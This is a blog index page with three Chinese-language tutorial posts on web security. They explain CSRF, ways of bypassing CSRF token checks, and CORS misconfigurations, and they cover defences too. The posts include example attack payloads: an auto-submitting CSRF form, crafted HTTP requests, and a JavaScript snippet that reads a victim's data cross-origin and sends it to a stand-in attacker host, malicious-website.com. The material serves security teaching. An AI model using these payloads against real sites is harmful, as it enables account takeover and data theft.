<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://amiduai.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://amiduai.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-CSRF(1)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/15/CSRF(1)/" class="article-date">
  <time class="dt-published" datetime="2025-02-14T16:07:17.000Z" itemprop="datePublished">2025-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/15/CSRF(1)/">CSRF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在本节中，我们将解释什么是跨站请求伪造，列举一些常见的 CSRF 漏洞示例，并说明如何防范 CSRF 攻击。</p>
<h2 id="什么是-CSRF？"><a href="#什么是-CSRF？" class="headerlink" title="什么是 CSRF？"></a>什么是 CSRF？</h2><p>跨站请求伪造（也称为 CSRF）是一种网络安全漏洞，攻击者可利用该漏洞诱使用户执行他们本无意执行的操作。它使攻击者能够部分绕过同源策略，而同源策略旨在防止不同网站相互干扰。</p>
<h2 id="CSRF-攻击的影响是什么？"><a href="#CSRF-攻击的影响是什么？" class="headerlink" title="CSRF 攻击的影响是什么？"></a>CSRF 攻击的影响是什么？</h2><p>在成功的 CSRF 攻击中，攻击者会使受害用户无意中执行某项操作。例如，这可能是更改其账户的电子邮件地址、更改密码或进行资金转账。根据操作的性质，攻击者可能能够完全控制用户的账户。如果被入侵的用户在应用程序中具有特权角色，那么攻击者可能能够完全控制应用程序的所有数据和功能。</p>
<h2 id="CSRF-是如何运作的？"><a href="#CSRF-是如何运作的？" class="headerlink" title="CSRF 是如何运作的？"></a>CSRF 是如何运作的？</h2><p>要实现 CSRF 攻击，必须满足三个关键条件：</p>
<p>相关操作。应用程序中存在攻击者有理由诱导用户执行的操作。这可能是一个特权操作（例如修改其他用户的权限），或者是对用户特定数据执行的任何操作（例如更改用户自己的密码）。</p>
<p>基于 Cookie 的会话处理。执行该操作涉及发出一个或多个 HTTP 请求，并且应用程序仅依赖会话 Cookie 来识别发出请求的用户。不存在其他用于跟踪会话或验证用户请求的机制。</p>
<p>请求参数可预测。执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，在诱使用户更改密码时，如果攻击者需要知道现有密码的值，那么该功能就不存在漏洞。 例如，假设一个应用程序包含一个允许用户更改其账户电子邮件地址的功能。当用户执行此操作时，他们会发出如下 HTTP 请求：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span><br><span class="line"></span><br><span class="line">email=wiener@normal-user.com</span><br></pre></td></tr></table></figure>
<p>这满足了 CSRF 所需的条件：</p>
<p>攻击者会对更改用户账户电子邮件地址的操作感兴趣。执行此操作后，攻击者通常能够触发密码重置并完全控制用户的账户。<br>应用程序使用会话 Cookie 来识别发出请求的用户。<br>不存在其他用于跟踪用户会话的令牌或机制。<br>攻击者可以轻松确定执行该操作所需的请求参数的值。<br>在满足这些条件的情况下，攻击者可以构建一个包含以下 HTML 的网页：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果受害用户访问攻击者的网页，将会发生以下情况：</p>
<p>攻击者的页面将触发对存在漏洞的网站的 HTTP 请求。如果用户已登录到存在漏洞的网站，其浏览器将自动在请求中包含其会话 Cookie（假设未使用 SameSite Cookie）。<br>存在漏洞的网站将以正常方式处理该请求，将其视为由受害用户发出的请求，并更改其电子邮件地址。<br>注意<br>虽然 CSRF 通常是在基于 Cookie 的会话处理的背景下进行描述，但它也会出现在其他情况下，即应用程序自动将一些用户凭证添加到请求中，例如 HTTP 基本认证和基于证书的认证</p>
<h2 id="如何构建-CSRF-攻击"><a href="#如何构建-CSRF-攻击" class="headerlink" title="如何构建 CSRF 攻击"></a>如何构建 CSRF 攻击</h2><p>手动创建 CSRF 利用所需的 HTML 可能很麻烦，特别是当所需的请求包含大量参数或请求存在其他特殊情况时。构建 CSRF 利用的最简单方法是使用 Burp Suite Professional 内置的 CSRF PoC 生成器：</p>
<p>在 Burp Suite Professional 中的任何位置选择您要测试或利用的请求。<br>从右键上下文菜单中，选择 “Engagement tools（参与工具）”&#x2F;“Generate CSRF PoC（生成 CSRF PoC）”。<br>Burp Suite 将生成一些 HTML，这些 HTML 将触发所选的请求（不包含 Cookie，Cookie 将由受害者的浏览器自动添加）。<br>您可以在 CSRF PoC 生成器中调整各种选项，以微调攻击的各个方面。在某些不寻常的情况下，您可能需要这样做，以处理请求的特殊功能。<br>将生成的 HTML 复制到一个网页中，在已登录到存在漏洞的网站的浏览器中查看该网页，并测试预期的请求是否成功发出以及所需的操作是否发生。</p>
<h2 id="如何实施-CSRF-攻击"><a href="#如何实施-CSRF-攻击" class="headerlink" title="如何实施 CSRF 攻击"></a>如何实施 CSRF 攻击</h2><p>跨站请求伪造攻击的实施机制与反射型 XSS 基本相同。通常，攻击者会将恶意 HTML 放置在他们控制的网站上，然后诱使受害者访问该网站。这可能通过向用户发送指向该网站的链接来实现，例如通过电子邮件或社交媒体消息。或者，如果攻击被放置在一个热门网站上（例如，在用户评论中），他们可能只需等待用户访问该网站。</p>
<p>请注意，一些简单的 CSRF 攻击采用 GET 方法，并且可以通过存在漏洞的网站上的单个 URL 完全独立实现。在这种情况下，攻击者可能不需要使用外部网站，而是可以直接向受害者提供存在漏洞的域上的恶意 URL。在前面的示例中，如果更改电子邮件地址的请求可以使用 GET 方法执行，那么一个独立的攻击看起来可能如下：</p>
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
## 防范CSRF的常见措施
如今，成功发现并利用CSRF漏洞通常需要绕过目标网站、受害者浏览器或两者部署的反CSRF措施。您会遇到的最常见防御措施如下：

<p>CSRF 令牌 - CSRF 令牌是由服务器端应用程序生成并与客户端共享的唯一、保密且不可预测的值。当尝试执行敏感操作（例如提交表单）时，客户端必须在请求中包含正确的 CSRF 令牌。这使得攻击者很难代表受害者构造有效的请求。<br>SameSite Cookie - SameSite 是一种浏览器安全机制，用于确定网站的 Cookie 何时包含在源自其他网站的请求中。由于执行敏感操作的请求通常需要经过身份验证的会话 Cookie，适当的 SameSite 限制可能会阻止攻击者跨站触发这些操作。自 2021 年起，Chrome 默认强制执行 Lax SameSite 限制。由于这是提议的标准，我们预计其他主流浏览器未来也会采用这种行为。<br>基于 Referer 的验证 - 一些应用程序利用 HTTP Referer 标头来尝试防范 CSRF 攻击，通常是通过验证请求是否源自应用程序自身的域。这通常不如 CSRF 令牌验证有效。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/15/CSRF(1)/" data-id="cm74z60hq0000ve6scuxaa6ty" data-title="CSRF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CSRF(2)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/15/CSRF(2)/" class="article-date">
  <time class="dt-published" datetime="2025-02-14T16:07:17.000Z" itemprop="datePublished">2025-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/15/CSRF(2)/">绕过 CSRF 令牌验证</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在本节中，我们将解释什么是 CSRF 令牌，它们如何防范 CSRF 攻击，以及攻击者可能如何绕过这些防御措施。</p>
<h2 id="什么是-CSRF-令牌？"><a href="#什么是-CSRF-令牌？" class="headerlink" title="什么是 CSRF 令牌？"></a>什么是 CSRF 令牌？</h2><p>CSRF 令牌是由服务器端应用程序生成并与客户端共享的唯一、保密且不可预测的值。当客户端发起执行敏感操作的请求（例如提交表单）时，必须包含正确的 CSRF 令牌。否则，服务器将拒绝执行所请求的操作。</p>
<p>一种常见的与客户端共享 CSRF 令牌的方式是将其作为 HTML 表单中的隐藏参数，例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;change-email-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;example@normal-website.com&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&#x27;button&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt;</span> Update email <span class="tag">&lt;/<span class="name">button</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>提交此表单会产生以下请求：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /my-account/change-email HTTP/1.1 </span><br><span class="line">Host: normal-website.com </span><br><span class="line">Content-Length: 70 </span><br><span class="line">Content-Type: application/x-www-form-urlencoded  </span><br><span class="line"></span><br><span class="line">csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&amp;email=example@normal-website.com</span><br></pre></td></tr></table></figure>
<p>如果实现正确，CSRF 令牌可以使攻击者难以代表受害者构造有效的请求，从而有助于防范 CSRF 攻击。由于攻击者无法预测 CSRF 令牌的正确值，他们将无法在恶意请求中包含该令牌。</p>
<p>注意：<br>CSRF 令牌不必作为 POST 请求中的隐藏参数发送。例如，有些应用程序会将 CSRF 令牌放在 HTTP 标头中。令牌的传输方式对整个机制的安全性有重大影响。</p>
<h2 id="CSRF-令牌验证中的常见缺陷"><a href="#CSRF-令牌验证中的常见缺陷" class="headerlink" title="CSRF 令牌验证中的常见缺陷"></a>CSRF 令牌验证中的常见缺陷</h2><p>CSRF 漏洞通常是由于 CSRF 令牌验证存在缺陷而产生的。在本节中，我们将介绍一些使攻击者能够绕过这些防御措施的最常见问题。</p>
<h2 id="CSRF-令牌验证依赖于请求方法"><a href="#CSRF-令牌验证依赖于请求方法" class="headerlink" title="CSRF 令牌验证依赖于请求方法"></a>CSRF 令牌验证依赖于请求方法</h2><p>有些应用程序在请求使用 POST 方法时会正确验证令牌，但在使用 GET 方法时会跳过验证。</p>
<p>在这种情况下，攻击者可以切换到 GET 方法来绕过验证并实施 CSRF 攻击：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /email/change?email=pwned@evil-user.net HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span><br></pre></td></tr></table></figure>
<p>CSRF 令牌验证依赖于令牌是否存在<br>有些应用程序在令牌存在时会正确验证，但如果省略令牌则会跳过验证。</p>
<p>在这种情况下，攻击者可以移除包含令牌的整个参数（而不仅仅是其值）来绕过验证并实施 CSRF 攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Content-Length: 25 </span><br><span class="line">Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm  </span><br><span class="line"></span><br><span class="line">email=pwned@evil-user.net</span><br></pre></td></tr></table></figure>
<h2 id="CSRF-令牌未与用户会话绑定"><a href="#CSRF-令牌未与用户会话绑定" class="headerlink" title="CSRF 令牌未与用户会话绑定"></a>CSRF 令牌未与用户会话绑定</h2><p>有些应用程序不会验证令牌是否属于发出请求的用户的同一会话。相反，应用程序会维护一个已发出令牌的全局池，并接受该池中出现的任何令牌。</p>
<p>在这种情况下，攻击者可以使用自己的账户登录应用程序，获取一个有效令牌，然后在 CSRF 攻击中将该令牌提供给受害用户。</p>
<h2 id="CSRF-令牌与非会话-Cookie-绑定"><a href="#CSRF-令牌与非会话-Cookie-绑定" class="headerlink" title="CSRF 令牌与非会话 Cookie 绑定"></a>CSRF 令牌与非会话 Cookie 绑定</h2><p>作为上述漏洞的一种变体，有些应用程序确实会将 CSRF 令牌与 Cookie 绑定，但不是与会话跟踪所使用的同一个 Cookie 绑定。当应用程序使用两个不同的框架（一个用于会话处理，一个用于 CSRF 保护）且它们没有集成在一起时，就很容易出现这种情况：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Content-Length: 68 </span><br><span class="line">Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  </span><br><span class="line"></span><br><span class="line">csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com</span><br></pre></td></tr></table></figure>
<p>这种情况更难利用，但仍然存在漏洞。如果网站包含任何允许攻击者在受害者浏览器中设置 Cookie 的行为，那么攻击就有可能实现。攻击者可以使用自己的账户登录应用程序，获取一个有效令牌和相关的 Cookie，利用设置 Cookie 的行为将自己的 Cookie 放入受害者的浏览器中，并在 CSRF 攻击中将自己的令牌提供给受害者。</p>
<p>注意：<br>设置 Cookie 的行为甚至不必存在于与 CSRF 漏洞所在的同一个 Web 应用程序中。如果所控制的 Cookie 具有合适的作用域，那么同一整体 DNS 域内的任何其他应用程序都有可能被用来在目标应用程序中设置 Cookie。例如，可以利用 staging.demo.normal-website.com 上的 Cookie 设置功能来放置一个会提交到 secure.normal-website.com 的 Cookie。</p>
<h2 id="CSRF-令牌简单地复制到-Cookie-中"><a href="#CSRF-令牌简单地复制到-Cookie-中" class="headerlink" title="CSRF 令牌简单地复制到 Cookie 中"></a>CSRF 令牌简单地复制到 Cookie 中</h2><p>作为上述漏洞的进一步变体，有些应用程序不会维护已发出令牌的任何服务器端记录，而是将每个令牌同时复制到 Cookie 和请求参数中。在验证后续请求时，应用程序只是验证请求参数中提交的令牌是否与 Cookie 中提交的值匹配。这有时被称为针对 CSRF 的 “双重提交” 防御，因其易于实现且无需任何服务器端状态而受到推崇：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /email/change HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Content-Type: application/x-www-form-urlencoded </span><br><span class="line">Content-Length: 68 </span><br><span class="line">Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa  </span><br><span class="line"></span><br><span class="line">csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com</span><br></pre></td></tr></table></figure>
<p>在这种情况下，如果网站包含任何设置 Cookie 的功能，攻击者仍然可以实施 CSRF 攻击。在这里，攻击者无需获取自己的有效令牌。他们只需编造一个令牌（如果有格式检查，可能需要符合所需格式），利用设置 Cookie 的行为将自己的 Cookie 放入受害者的浏览器中，并在 CSRF 攻击中将该令牌提供给受害者。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://amiduai.github.io/2025/02/15/CSRF(2)/" data-id="cm74z60hs0001ve6s04pkh6t0" data-title="绕过 CSRF 令牌验证" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/02/15/CORS/" class="article-date">
  <time class="dt-published" datetime="2025-02-14T16:07:17.000Z" itemprop="datePublished">2025-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/02/15/CORS/">CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在本节中，我们将解释跨源资源共享（CORS）是什么，描述一些基于跨源资源共享的常见攻击示例，并讨论如何防范这些攻击。</p>
<h2 id="什么是-CORS（跨源资源共享）？"><a href="#什么是-CORS（跨源资源共享）？" class="headerlink" title="什么是 CORS（跨源资源共享）？"></a>什么是 CORS（跨源资源共享）？</h2><p>跨源资源共享（CORS）是一种浏览器机制，它允许对特定域之外的资源进行受控访问。它扩展了同源策略（SOP）并增加了其灵活性。然而，如果网站的 CORS 策略配置和实施不当，它也会为跨域攻击提供可乘之机。CORS 并不能防范诸如跨站请求伪造（CSRF）之类的跨源攻击 。</p>
<p>跨源资源共享示意图<br>[！跨源资源共享示意图]（</p>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是一种限制性的跨源规范，它限制了网站与源域之外的资源进行交互的能力。同源策略是多年前为应对潜在的恶意跨域交互（例如一个网站窃取另一个网站的私人数据）而制定的。它通常允许一个域向其他域发出请求，但不允许访问响应内容。</p>
<h2 id="同源策略的放宽"><a href="#同源策略的放宽" class="headerlink" title="同源策略的放宽"></a>同源策略的放宽</h2><p>同源策略非常严格，因此人们想出了各种方法来规避这些限制。许多网站以需要完全跨源访问的方式与子域或第三方站点进行交互。使用跨源资源共享（CORS）可以对同源策略进行有控制的放宽。</p>
<p>跨源资源共享协议使用一组 HTTP 头，这些头定义了受信任的网络源以及相关属性，例如是否允许经过身份验证的访问。这些头在浏览器与它试图访问的跨源网站之间的头信息交换中组合使用。</p>
<h2 id="由-CORS-配置问题引发的漏洞"><a href="#由-CORS-配置问题引发的漏洞" class="headerlink" title="由 CORS 配置问题引发的漏洞"></a>由 CORS 配置问题引发的漏洞</h2><p>许多现代网站使用 CORS 来允许来自子域和受信任第三方的访问。它们对 CORS 的实现可能存在错误，或者为了确保一切正常运行而过于宽松，这可能会导致可被利用的漏洞。</p>
<h3 id="根据客户端指定的-Origin-头发送服务器生成的-ACAO-头"><a href="#根据客户端指定的-Origin-头发送服务器生成的-ACAO-头" class="headerlink" title="根据客户端指定的 Origin 头发送服务器生成的 ACAO 头"></a>根据客户端指定的 Origin 头发送服务器生成的 ACAO 头</h3><p>一些应用程序需要向多个其他域提供访问权限。维护一个允许的域列表需要持续的努力，而且任何错误都可能导致功能出现问题。因此，一些应用程序选择了简单的方法，实际上允许来自任何其他域的访问。<br>实现这一点的一种方法是读取请求中的 Origin 头，并在响应头中声明允许请求的源。例如，假设一个应用程序收到以下请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data HTTP/1.1 </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: https://malicious-website.com </span><br><span class="line">Cookie: sessionid=...</span><br></pre></td></tr></table></figure>
<p>然后它的响应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://malicious-website.com </span><br><span class="line">Access-Control-Allow-Credentials: true ...</span><br></pre></td></tr></table></figure>
<p>这些头信息表明允许来自请求域（malicious-website.com）的访问，并且跨源请求可以包含 cookie（Access-Control-Allow-Credentials: true），因此将在会话中进行处理。</p>
<p>因为应用程序在 Access-Control-Allow-Origin 头中反映任意来源，这意味着任何域都可以访问易受攻击域的资源。如果响应包含任何敏感信息，例如 API 密钥或 CSRF 令牌，您可以通过在自己的网站上放置以下脚本来获取这些信息：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">req.<span class="property">onload</span> = reqListener; </span><br><span class="line">req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://vulnerable-website.com/sensitive-victim-data&#x27;</span>,<span class="literal">true</span>); </span><br><span class="line">req.<span class="property">withCredentials</span> = <span class="literal">true</span>; req.<span class="title function_">send</span>(); </span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) &#123;     </span><br><span class="line">       location=<span class="string">&#x27;//malicious-website.com/log?key=&#x27;</span>+<span class="variable language_">this</span>.<span class="property">responseText</span>; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="解析-Origin-头时出错"><a href="#解析-Origin-头时出错" class="headerlink" title="解析 Origin 头时出错"></a>解析 Origin 头时出错</h3><p>一些支持来自多个源访问的应用程序通过使用允许来源的白名单来实现这一点。当收到 CORS 请求时，会将提供的来源与白名单进行比较。如果来源出现在白名单中，那么它将被反映在 Access-Control-Allow-Origin 头中，从而授予访问权限。例如，应用程序收到一个正常请求，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /data HTTP/1.1 </span><br><span class="line">Host: normal-website.com </span><br><span class="line">... </span><br><span class="line">Origin: https://innocent-website.com</span><br></pre></td></tr></table></figure>
<p>应用程序会将提供的来源与它的允许来源列表进行检查，如果在列表中，则如下反映来源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">... </span><br><span class="line">Access-Control-Allow-Origin: https://innocent-website.com</span><br></pre></td></tr></table></figure>
<p>在实现 CORS 来源白名单时经常会出现错误。一些组织决定允许来自其所有子域（包括尚未存在的未来子域）的访问。还有一些应用程序允许来自其他各种组织的域（包括其子域）的访问。这些规则通常通过匹配 URL 前缀或后缀，或使用正则表达式来实现。实现过程中的任何错误都可能导致向意外的外部域授予访问权限。</p>
<p>例如，假设一个应用程序授予对所有以<a target="_blank" rel="noopener" href="http://normal-website.com结尾的域的访问权限.攻击者可能通过注册http//hackersnormal-website.com%E5%9F%9F%E6%9D%A5%E8%8E%B7%E5%BE%97%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82%E6%88%96%E8%80%85%EF%BC%8C%E5%81%87%E8%AE%BE%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%88%E4%BA%88%E5%AF%B9%E6%89%80%E6%9C%89%E4%BB%A5http://normal-website.com%E5%BC%80%E5%A4%B4%E7%9A%84%E5%9F%9F%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E8%83%BD%E4%BD%BF%E7%94%A8http://normal-website.com.evil-user.net%E5%9F%9F%E6%9D%A5%E8%8E%B7%E5%BE%97%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E3%80%82">http://normal-website.com结尾的域的访问权限。攻击者可能通过注册http://hackersnormal-website.com域来获得访问权限。或者，假设一个应用程序授予对所有以http://normal-website.com开头的域的访问权限。攻击者可能使用http://normal-website.com.evil-user.net域来获得访问权限。</a></p>
<h3 id="白名单中的-null-来源值"><a href="#白名单中的-null-来源值" class="headerlink" title="白名单中的 null 来源值"></a>白名单中的 null 来源值</h3><p>Origin 头的规范支持 null 值。浏览器可能在各种不寻常的情况下在 Origin 头中发送 null 值：跨源重定向；来自序列化数据的请求；使用 file: 协议的请求；沙盒化的跨源请求。<br>一些应用程序可能会将 null 来源列入白名单，以支持应用程序的本地开发。例如，假设一个应用程序收到以下跨源请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data </span><br><span class="line">Host: vulnerable-website.com </span><br><span class="line">Origin: null</span><br></pre></td></tr></table></figure>
<p>服务器响应如下：</p>
